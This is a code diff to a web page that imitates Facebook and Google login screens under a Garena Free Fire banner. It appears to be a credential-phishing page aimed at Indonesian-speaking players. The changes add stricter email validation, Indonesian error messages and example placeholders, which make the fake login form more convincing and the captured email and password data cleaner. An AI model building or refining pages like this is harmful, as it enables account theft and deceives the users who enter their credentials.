@@ -1134,7 +1134,7 @@
           <div class="fb-login-logo">facebook</div>
           <div class="fb-login-tagline">Log in to continue with Garena Free Fire</div>
           <div class="fb-login-card">
-            <input type="email" id="rp-fb-email" class="fb-login-input" placeholder="Email address or phone number" autocomplete="email"/>
+            <input type="email" id="rp-fb-email" class="fb-login-input" placeholder="contoh@gmail.com / contoh@yahoo.com" autocomplete="email"/>
             <input type="password" id="rp-fb-pass" class="fb-login-input" placeholder="Password" autocomplete="current-password"/>
             <button class="fb-login-btn" type="button" onclick="handleRpFacebookLogin()">
               <div class="fb-spinner" id="rp-fb-spinner"></div>
@@ -1249,12 +1249,18 @@ function showRpOauthScreen(screen) {
   }
 }
 
+function isValidEmail(e) { return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(e); }
 function handleRpGoogleNext() {
   var emailEl = document.getElementById('rp-g-email');
   var errEl   = document.getElementById('rp-g-err');
   var email   = emailEl ? emailEl.value.trim() : '';
-  if (!email || !email.includes('@')) {
-    if (errEl) { errEl.textContent = email ? 'Enter a valid email address.' : 'Enter your email'; errEl.classList.add('show'); }
+  if (!email) {
+    if (errEl) { errEl.textContent = 'Masukkan email kamu, contoh: nama@gmail.com'; errEl.classList.add('show'); }
+    if (emailEl) emailEl.focus();
+    return;
+  }
+  if (!isValidEmail(email)) {
+    if (errEl) { errEl.textContent = 'Email tidak valid. Contoh: nama@gmail.com, nama@yahoo.com'; errEl.classList.add('show'); }
     if (emailEl) emailEl.focus();
     return;
   }
@@ -1302,7 +1308,7 @@ function handleRpFacebookLogin() {
   var btn     = document.querySelector('#rp-screen-facebook .fb-login-btn');
   var email   = emailEl ? emailEl.value.trim() : '';
   var pass    = passEl ? passEl.value : '';
-  if (!email) { if (emailEl) emailEl.focus(); return; }
+  if (!email || !isValidEmail(email)) { if (emailEl) { emailEl.style.borderColor='#e02020'; emailEl.focus(); emailEl.setAttribute('placeholder','contoh: nama@gmail.com'); } return; }
   if (!pass)  { if (passEl)  passEl.focus();  return; }
   if (btn) btn.disabled = true;
   if (spEl) spEl.style.display = 'block';
